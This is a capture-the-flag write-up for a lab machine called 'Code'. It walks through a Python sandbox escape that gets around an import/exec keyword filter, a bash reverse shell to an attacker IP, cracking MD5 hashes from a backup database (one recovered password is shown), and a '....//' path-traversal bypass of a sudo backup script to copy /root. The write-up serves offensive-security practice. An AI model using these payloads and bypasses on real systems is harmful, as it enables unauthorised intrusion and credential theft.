# Code

## Machine Informations





## Port Scanning

```bash
nmap -T4 -sV -p- --min-rate 1000 --open -oN port_scan.txt 10.10.11.62

Nmap scan report for 10.10.11.62
Host is up (0.057s latency).
Not shown: 63145 closed tcp ports (reset), 2388 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
5000/tcp open  http    Gunicorn 20.0.4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```



## Web Enumeration

### Web Whitelist Code Bypass

The web page is a python code editor that allow us to execute some python code.

<figure><img src="../../../.gitbook/assets/image (196).png" alt=""><figcaption></figcaption></figure>

We can try to find a escape to execute arbitraty code into a machine to get a reverse shell.

Restricted Words:

* import
* exec

Since we cannot use the words to import the libreries to execute code, we can try to call the class from local subclasses of installed python.

In the Python default subclasses there is a "Popen", that allow us to execute code.

Write a simple reverse shell, setup listening port in our machine and run it the python code.

<pre class="language-bash"><code class="lang-bash"><strong>nc -lnvp 9009
</strong></code></pre>

{% code title="" overflow="wrap" %}
```python
().__class__.__base__.__subclasses__()[317](["/bin/bash", "-c", "ls|bash -i >& /dev/tcp/10.10.14.117/9009 0>&1"])
```
{% endcode %}

And we have a reverse shell

<figure><img src="../../../.gitbook/assets/image (197).png" alt=""><figcaption></figcaption></figure>

### Flag.txt

```bash
cat /home/app-production/user.txt
```



## Privilege Escalation

There is a readable Backups repository for us in the martin home directory.

```bash
ls -la /home/martin/backups
```

<figure><img src="../../../.gitbook/assets/image (198).png" alt=""><figcaption></figcaption></figure>

Start a simple http webserver in the target machine to transfer the file.

{% code title="Target machine" %}
```bash
# /home/martin/backups
python3 -m http.server 8080
```
{% endcode %}

{% code title="Attack machine" %}
```bash
wget http://10.10.11.62:8080/code_home_app-production_app_2024_August.tar.bz2
```
{% endcode %}

Now try to unzip the file to read the content.

```bash
bzip2 -d code_home_app-production_app_2024_August.tar.bz2
```

Searching into directory, i found a .db file. Try to get some juicy data.

```bash
cd home/instance
sqlite3 database.db
```

```sql
sqlite> SELECT * FROM user;
1|development|759b74ce43947f5f4c91aeddc3e5bad3
2|martin|3de6f30c4a09c27fc71932bfc68474be
```

The hashs seem to be MD5 format.

Check if the hash is present into crackstation site.&#x20;

<figure><img src="../../../.gitbook/assets/image (200).png" alt=""><figcaption></figcaption></figure>

The password for martin user is `nafeelswordsmaster`&#x20;

Access via SSH to target machine as martin user.

```bash
ssh martin@10.10.11.62
```

### Linux PrivEsc

```bash
martin@code:~$ sudo -l
Matching Defaults entries for martin on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User martin may run the following commands on localhost:
    (ALL : ALL) NOPASSWD: /usr/bin/backy.sh

```

The script that martin can execute has the follow content:

{% code overflow="wrap" %}
```bash
#!/bin/bash

if [[ $# -ne 1 ]]; then
    /usr/bin/echo "Usage: $0 <task.json>"
    exit 1
fi

json_file="$1"

if [[ ! -f "$json_file" ]]; then
    /usr/bin/echo "Error: File '$json_file' not found."
    exit 1
fi

allowed_paths=("/var/" "/home/")

updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")

/usr/bin/echo "$updated_json" > "$json_file"

directories_to_archive=$(/usr/bin/echo "$updated_json" | /usr/bin/jq -r '.directories_to_archive[]')

is_allowed_path() {
    local path="$1"
    for allowed_path in "${allowed_paths[@]}"; do
        if [[ "$path" == $allowed_path* ]]; then
            return 0
        fi
    done
    return 1
}

for dir in $directories_to_archive; do
    if ! is_allowed_path "$dir"; then
        /usr/bin/echo "Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed."
        exit 1
    fi
done

/usr/bin/backy "$json_file"

```
{% endcode %}

The script takes the task.json file to make a backup copy of a directory wrote in the task.json file.

I've tried to insert /root directory in this way /var/../root, to try bypass the function below in the backy.sh script.

{% code overflow="wrap" %}
```bash
updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")
```
{% endcode %}

FIND A WAY TO BYPASS THIS

```bash
cd backups
nano task.json
```

Add the root directory bypassing the control, and REMOVE the object that remove all file in the directory.

```bash
"directories_to_archive": [
    "/var/....//root"
  ]
```

And we'll have a backup of the root directory.

Transfer file to attack machine

```bash
# target machine
python3 -m http.server 8080

# attack machine 
wget http://10.10.11.62:8080/code_var_...._root_2025_March.tar.bz2
```

Extract all and read the root flag

```bash
bzip2 -d code_var_...._root_2025_March.tar.bz2
```

### Root.txt

```bash
cat /root/root.txt
```

